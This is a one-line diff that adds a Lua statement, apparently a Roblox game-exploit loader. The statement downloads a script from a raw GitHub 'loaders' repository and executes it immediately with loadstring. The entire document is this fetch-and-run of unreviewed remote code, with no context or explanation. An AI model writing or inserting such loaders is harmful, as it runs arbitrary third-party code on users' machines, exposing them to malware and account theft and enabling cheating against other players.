@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/slayers-2-spam6-kuunpin4iw21uh.lua"))()
